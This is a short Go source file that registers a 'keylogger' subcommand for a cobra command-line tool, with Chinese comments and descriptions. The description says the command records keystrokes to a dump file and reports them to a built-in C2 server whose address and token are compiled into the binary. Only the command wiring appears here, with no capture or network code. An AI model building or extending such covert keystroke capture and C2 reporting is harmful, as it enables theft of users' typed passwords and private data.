package cmd

import "github.com/spf13/cobra"

// keylogger 子命令定义(两端共用一份描述文本),
// 具体 Run 实现按平台拆分:keylogger_windows.go / keylogger_other.go
var keylogger = &cobra.Command{
	Use:   "keylogger",
	Short: "键盘记录器",
	Long: `实时记录键盘输入信息到用户目录下 Golin/dump.txt,
并上报至内置的 C2 服务器(服务端地址与令牌内置于二进制,见 c2secret 包)`,
	Run: KeyLoggerCmd,
}

func init() {
	rootCmd.AddCommand(keylogger)
}
